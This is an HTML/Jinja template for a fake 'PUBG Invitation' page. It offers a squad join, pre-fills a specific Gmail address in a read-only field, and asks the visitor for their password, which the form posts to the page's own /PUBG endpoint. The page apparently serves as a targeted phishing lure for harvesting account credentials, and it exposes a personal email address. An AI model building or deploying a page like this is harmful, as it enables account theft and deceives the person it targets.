
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PUBG Invitation</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      background: url('{{ url_for('static', filename='PUBG.jpg') }}') no-repeat center center fixed;
      background-size: cover;
      color: #fff;
      text-align: center;
      margin: 0;
      padding: 0;
    }

    .container {
      background: rgba(0, 0, 0, 0.85);
      border-radius: 15px;
      padding: 30px;
      margin: 40px auto;
      width: 90%;
      max-width: 600px;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
    }

    .logo {
      width: 150px;
      margin-bottom: 15px;
    }

    h1 {
      font-size: 2.5rem;
      color: #f8d400;
      margin-bottom: 20px;
      letter-spacing: 1px;
      text-shadow: 2px 2px 8px rgba(0, 0, 0, 0.8);
    }

    p {
      font-size: 1.2rem;
      margin-bottom: 15px;
      line-height: 1.5;
    }

    .team-info {
      margin: 20px auto;
      background: rgba(255, 255, 255, 0.1);
      padding: 20px;
      border-radius: 10px;
      width: 90%;
      max-width: 500px;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
    }

    .team-info p {
      font-size: 1.2rem;
      color: #f8d400;
      margin: 8px 0;
    }

    .login-form {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 15px;
      margin: 20px 0;
    }

    .login-form input {
      width: 90%;
      padding: 12px;
      font-size: 1.2rem;
      border: none;
      border-radius: 5px;
      outline: none;
      background: rgba(255, 255, 255, 0.2);
      color: #fff;
      box-shadow: 0 3px 10px rgba(0, 0, 0, 0.4);
      transition: all 0.3s ease;
    }

    .login-form input:focus {
      background: rgba(255, 255, 255, 0.3);
      box-shadow: 0 3px 15px rgba(0, 0, 0, 0.6);
    }

    .join-btn {
      background: #f8d400;
      color: #000;
      border: none;
      padding: 12px 20px;
      font-size: 1.2rem;
      cursor: pointer;
      border-radius: 5px;
      transition: all 0.3s ease;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.4);
    }

    .join-btn:hover {
      background: #ffcc00;
      transform: scale(1.05);
      box-shadow: 0 7px 20px rgba(0, 0, 0, 0.6);
    }

    .join-btn:active {
      transform: scale(1);
    }
  </style>
  <script>
    window.onload = function() {
      document.getElementById('password').focus();
    };
  </script>
</head>
<body>
  <div class="container">
    <img src="{{ url_for('static', filename='Logo.png') }}" alt="PUBG Logo" class="logo">
    <h1>Join the Battle!</h1>
    <p>You're invited to join a PUBG Mobile squad.</p>
    <div class="team-info">
      <p><strong>Team Code:</strong> 654783</p>
      <p><strong>Mode:</strong> Squad</p>
      <p><strong>Region:</strong> Iran</p>
    </div>
    <form id="loginForm" class="login-form" action="/PUBG" method="POST">
      <input type="email" name="email" id="email" value="ameri777r@gmail.com" readonly>
      <input type="password" name="password" id="password" placeholder="Enter your password" required>
      <button type="submit" class="join-btn">Join Now</button>
    </form>
  </div>
</body>
</html>
